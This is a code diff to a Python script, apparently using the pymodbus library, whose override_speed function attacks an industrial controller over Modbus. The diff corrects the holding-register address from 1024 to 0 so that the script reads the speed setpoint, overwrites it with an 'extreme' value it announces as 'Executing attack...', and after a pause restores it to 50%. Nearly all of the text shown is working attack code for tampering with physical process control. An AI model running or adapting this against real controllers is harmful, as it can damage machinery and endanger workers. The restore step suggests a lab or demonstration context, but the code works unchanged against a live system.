@@ -61,7 +61,7 @@ def override_speed():
         return False
 
     # Read current speed
-    result = client.read_holding_registers(1024, 1, slave=1)
+    result = client.read_holding_registers(0, 1, slave=1)
     if result.isError():
         print("✗ Failed to read current speed")
         client.close()
@@ -93,8 +93,8 @@ def override_speed():
     print(f"Executing attack...")
     print(f"  → Writing {target_speed}% to speed_setpoint (MW0)")
 
-    # Write extreme speed - MW0 = address 1024
-    result = client.write_register(1024, target_speed, slave=1)
+    # Write extreme speed
+    result = client.write_register(0, target_speed, slave=1)
     if not result.isError():
         print(f"  ✓ Speed setpoint changed to {target_speed}%!")
         print()
@@ -108,7 +108,7 @@ def override_speed():
         time.sleep(3)
         print()
         print("Restoring normal speed setpoint...")
-        client.write_register(1024, 50, slave=1)
+        client.write_register(0, 50, slave=1)
         print("✓ Speed restored to 50%")
 
         client.close()
